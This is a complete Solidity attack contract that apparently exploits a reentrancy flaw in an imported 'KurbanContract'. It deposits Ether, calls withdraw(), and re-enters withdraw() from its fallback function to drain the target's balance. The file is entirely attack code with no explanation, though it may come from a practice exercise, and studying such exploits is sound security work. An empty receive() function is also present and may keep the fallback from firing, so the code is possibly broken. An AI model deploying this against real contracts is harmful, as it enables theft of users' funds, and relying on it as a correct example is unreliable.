// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./kurban.sol";

contract Attack {
    KurbanContract public kurbancontract;

    constructor(address kurbancontract_address) {
        kurbancontract = KurbanContract(kurbancontract_address);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function attack() external payable {
        kurbancontract.deposit{value: msg.value}();
        kurbancontract.withdraw();
    }

    fallback() external payable {
        if (address(kurbancontract).balance >= msg.value) {
            kurbancontract.withdraw();
        }
    }

    receive() external payable {}

}
